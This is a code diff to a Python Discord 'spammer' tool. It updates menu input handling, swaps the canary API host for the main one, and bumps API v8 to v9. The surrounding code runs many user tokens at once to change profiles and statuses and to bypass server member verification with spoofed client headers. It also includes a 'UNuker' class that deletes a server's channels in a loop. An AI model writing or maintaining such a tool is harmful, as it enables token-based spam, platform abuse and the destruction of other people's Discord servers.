@@ -792,8 +792,8 @@ def spammer():
         http.client._is_legal_header_name = re.compile(b'[^\\s][^:\\r\\n]*').fullmatch
         print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} About Changer')
         print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Activity Status Changer')
-        changg = int(input('[?]>'))
-        if changg == 1:
+        changg = input('[?]>')
+        if changg == '1':
 
             def abouttt(token, abbb):
                 try:
@@ -813,7 +813,7 @@ def spammer():
             for token in tokens:
                 threading.Thread(target=abouttt, args=(token, ab)).start()
 
-        if changg == 2:
+        if changg == '2':
             def activity(token, act):
                 ws = websocket.WebSocket()
                 actt = 'Online'
@@ -911,7 +911,7 @@ def spammer():
                     'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                     'authorization': token,
                     'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'}
-                bpsur = f"https://canary.discord.com/api/v9/guilds/{serverId}/member-verification?with_guild=false&invite_code=" + invite_code
+                bpsur = f"https://discord.com/api/v9/guilds/{serverId}/member-verification?with_guild=false&invite_code=" + invite_code
                 r1 = requests.get(bpsur, headers=headers).json()
                 data = {}
                 data['version'] = r1['version']
@@ -969,7 +969,7 @@ def spammer():
         exit = clear()
         exit = spammer()
 
-    if choice == 12:
+    if choice == '12':
 
         def filter_tokens(unfiltered):
             tokens = []
@@ -1244,7 +1244,7 @@ def spammer():
                 class UNuker:
                     def DeleteChannels(self, guild, channel):
                         while True:
-                            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headerrs)
+                            r = requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headerrs)
                             if 'retry_after' in r.text:
                                 time.sleep(r.json()['retry_after'])
                             else:
